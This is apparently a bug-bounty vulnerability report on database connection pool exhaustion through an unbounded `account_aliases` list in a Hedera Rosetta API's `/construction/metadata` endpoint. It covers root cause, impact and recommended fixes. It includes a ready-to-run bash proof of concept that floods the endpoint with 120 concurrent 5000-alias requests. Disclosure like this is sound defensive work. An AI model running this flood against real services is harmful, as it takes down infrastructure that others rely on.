### Title
Unbounded `account_aliases` Input in `ConstructionMetadata()` Enables DB Connection Pool Exhaustion via Concurrent Requests

### Summary
`ConstructionMetadata()` accepts an `account_aliases` option string with no length or count validation. `resolveAccountAliases()` iterates over every comma-separated alias and issues a synchronous database query per alias. Because there is no application-level rate limiting and the Traefik middleware protection is disabled by default, an unauthenticated attacker can flood the endpoint with concurrent requests each carrying a large alias list, holding DB connections long enough to exhaust the pool and starve all other database-dependent endpoints including health checks.

### Finding Description

**Code path:**

`ConstructionMetadata()` (lines 159–163) calls `resolveAccountAliases()` unconditionally when `account_aliases` is present in the request options. [1](#0-0) 

`resolveAccountAliases()` (lines 557–589) splits the raw string on commas and, for every element, calls `c.accountRepo.GetAccountId()` **synchronously inside the loop** — no goroutine, no batching, no cap on the number of iterations. [2](#0-1) 

`GetAccountId()` (lines 138–159 of `account.go`) acquires a real DB connection from the pool for every call via `ar.dbClient.GetDbWithContext(ctx)` and executes `selectCurrentCryptoEntityByAlias` before releasing it. [3](#0-2) 

**Root cause — failed assumption:** The code assumes `account_aliases` will contain at most one alias (the payer), matching the single-alias output of `ConstructionPreprocess()`. [4](#0-3) 

An attacker bypasses `ConstructionPreprocess` entirely and POSTs directly to `/construction/metadata` with an arbitrarily long comma-separated alias list. There is no length check, no alias-count cap, and no application-level rate limiter anywhere in the Go service.

**Why existing checks fail:**

The only rate-limiting protection is the Traefik middleware chain (`inFlightReq: 5`, `rateLimit: average: 10`), but it is gated on `global.middleware: true`, which defaults to `false`. [5](#0-4) [6](#0-5) 

The DB pool is capped at `maxOpenConnections: 100` (default). [7](#0-6) [8](#0-7) 

The HTTP `writeTimeout` of 10 s limits each individual request's lifetime, but within 10 s a single request with thousands of aliases can hold one connection for the full duration while making sequential queries. With 100 concurrent such requests the entire pool is occupied. [9](#0-8) 

### Impact Explanation
When all 100 pool connections are held by attacker requests, every other endpoint that needs a DB connection (block queries, balance queries, health/readiness probes) blocks or returns errors. The Kubernetes liveness probe (`/health/liveness`) and readiness probe (`/health/readiness`) will begin failing, causing the pod to be restarted or removed from service, which maps directly to the stated severity: shutdown of ≥30 % of network processing nodes without brute-force key compromise. [10](#0-9) 

### Likelihood Explanation
- No authentication or API key is required to call `/construction/metadata`.
- The Traefik middleware is off by default; most deployments that follow the default Helm values are unprotected.
- A single attacker machine can open 100+ concurrent HTTP connections. Each request body is a small JSON object with a long comma-separated string — trivially scriptable with `curl` or `wrk`.
- The attack is repeatable: after a pod restart the attacker simply resumes flooding.

### Recommendation
1. **Enforce an alias count cap** inside `resolveAccountAliases()` — reject requests where the number of comma-separated aliases exceeds a small constant (e.g., 10).
2. **Add application-level rate limiting** in the Go HTTP middleware stack (e.g., `golang.org/x/time/rate`) so protection is not dependent on an optional Traefik layer.
3. **Enable the Traefik middleware by default** (`global.middleware: true`) in the Helm chart.
4. **Validate total request body size** at the HTTP server level to bound the maximum alias string length.

### Proof of Concept

```bash
# Build a payload with 5000 fake aliases (each is a valid alias format)
ALIASES=$(python3 -c "
import base64, os
aliases = []
for _ in range(5000):
    raw = os.urandom(20)
    aliases.append('0.0.' + base64.b32encode(raw).decode().rstrip('='))
print(','.join(aliases))
")

PAYLOAD=$(cat <<EOF
{
  "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
  "options": {
    "operation_type": "CRYPTO_TRANSFER",
    "account_aliases": "$ALIASES"
  }
}
EOF
)

# Send 120 concurrent requests to exhaust the 100-connection pool
for i in $(seq 1 120); do
  curl -s -X POST http://<rosetta-host>:5700/construction/metadata \
    -H 'Content-Type: application/json' \
    -d "$PAYLOAD" &
done
wait

# Verify pool exhaustion: health check now times out or returns 503
curl -v http://<rosetta-host>:5700/health/liveness
```

Expected result: the liveness probe returns a 5xx or connection timeout while the 120 attacker goroutines hold all DB connections processing the 5000-alias loop.

```go
func (ar *accountRepository) GetAccountId(ctx context.Context, accountId types.AccountId) (
	zero types.AccountId,
	_ *rTypes.Error,
) {
	if !accountId.HasAlias() {
		return accountId, nil
	}

	db, cancel := ar.dbClient.GetDbWithContext(ctx)
	defer cancel()

	var entity domain.Entity
	if err := db.Raw(selectCurrentCryptoEntityByAlias, sql.Named("alias", accountId.GetAlias())).First(&entity).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			return zero, hErrors.ErrAccountNotFound
		}

		return zero, hErrors.ErrDatabaseError
	}

	return types.NewAccountIdFromEntityId(entity.Id), nil
}
```
